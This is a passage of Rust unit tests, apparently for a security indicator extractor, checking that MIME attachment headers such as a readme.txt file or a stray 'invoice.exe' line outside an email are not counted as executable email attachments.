Content-Type: text/plain; name="readme.txt"
Content-Disposition: attachment; filename="readme.txt"
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 0);
    }

    #[test]
    fn attachment_words_outside_email_are_not_email_attachment_evidence() {
        let indicators = extract_indicators(
            br#"Content-Disposition: attachment; filename="invoice.exe"
MIME-Version: 1.0
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 0);
    }
}
